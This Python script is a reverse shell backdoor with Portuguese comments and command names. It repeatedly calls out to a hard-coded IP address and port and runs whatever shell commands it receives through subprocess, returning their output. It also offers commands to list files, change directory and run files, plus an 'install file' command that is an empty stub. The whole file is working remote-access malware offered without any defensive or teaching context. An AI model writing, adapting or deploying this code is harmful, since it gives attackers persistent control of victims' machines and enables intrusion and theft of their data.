import socket
import time
import subprocess
import os

ip = "192.168.1.4"
port = 8080

def connection(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Inicializa o socket
            s.connect((ip, port))
            s.send(b"\n[!] Connection received.\n")
            return s
        except socket.error as e:
            if e.errno == 106:
                print("Socket already connected. Retrying...")
            else:
                print("Connection error:", e)
            time.sleep(10)  # Espera por 10 segundos antes de tentar novamente

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                print("[!] Connection closed by the client.")
                break
            if data[:-1].decode() == "/exit":
                s.close()
                break
            else:
                cmd(s, data[:-1].decode())
    except Exception as e:
        print("Error in listen:", e)

def cmd(s, data):
    try:
        if data.startswith("listar_arquivos"):
            files = os.listdir(os.getcwd())
            files_str = "\n".join(files)
            send_data(s, files_str)
        elif data.startswith("mudar_diretorio"):
            directory = data.split(" ", 1)[1]
            os.chdir(directory)
            send_data(s, "[+] Diretorio alterado com sucesso.")
        elif data.startswith("executar_arquivo"):
            arquivo = data.split(" ", 1)[1]
            proc = subprocess.Popen(arquivo, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out, err = proc.communicate()
            send_data(s, out.decode())
        elif data.startswith("instalar_arquivo"):
            # Lógica para instalar um arquivo
            # Certifique-se de validar e sanitizar entradas adequadas
            # ...
            send_data(s, "[+] Arquivo instalado com sucesso.")
        elif data.startswith("cd"):
            directory = data.split(" ", 1)[1]
            os.chdir(directory)
            send_data(s, "[+] Diretorio alterado com sucesso.")
        else:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out, err = proc.communicate()
            send_data(s, out.decode())
    except Exception as e:
        print("Error in cmd:", e)

def send_data(s, data):
    s.send(data.encode())

def main():
    while True:
        try:
            s_connected = connection(ip, port)
            if s_connected:
                listen(s_connected)
            else:
                print("Connection was wrong, trying again.")
        except Exception as e:
            print("Main error: ", e)
            time.sleep(10)

if __name__ == "__main__":
    main()
